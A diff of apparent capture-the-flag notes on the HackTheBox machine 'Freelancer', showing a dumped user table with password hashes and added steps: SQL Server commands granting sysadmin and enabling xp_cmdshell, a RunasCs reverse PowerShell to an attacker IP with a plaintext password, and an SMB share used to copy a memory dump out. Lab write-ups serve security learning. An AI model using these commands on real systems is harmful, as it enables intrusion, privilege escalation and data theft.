@@ -90,8 +90,23 @@ id	password	last_login	username	email	first_name	last_name	is_active	is_staff	is
 10010	pbkdf2_sha256$600000$EDV6OsGziCOHMqY9RblR9s$t0iZCw2bYEz1xGYNmOug8Db6DymRGtnOhRA0lOcScuM=	2024-06-02T23:14:56.238	testtest	test@test.com	test	test	true	false	false	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	0	test	2024-06-02T23:14:34.300		Freelancer
 10011	pbkdf2_sha256$600000$HVm3JTFXx8knW7xLntqcL7$m1rdEmeEO1Um8JgritpyFN5LQmUBD5A45k/FOVXE5TE=	2024-06-02T23:22:32.566	test1test	user123@test.com	test	test	true	false	false	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	0	test	2024-06-02T23:18:57.691	freelancer/templates/static/assets/images/users_profiles/10011.jpg	Employer
 
-johnHalond@freelancer.htb tomHazard@freelancer.htb looks interesting
+we need to set the permissions for Freelancer_webapp_user that could exploit the misconfiguration in the database
 
-now let try to crack it with hashcat:
+BEGIN
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_addsrvrolemember 'Freelancer_webapp_user', 'sysadmin';
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+END;
+
+./runascs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.199:4446
+
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username test -password test test .
+
+net use \\10.10.14.199\test /user:test test
+
+copy C:\Users\mikasaackerman\Desktop\MEMORY.7z
 
 
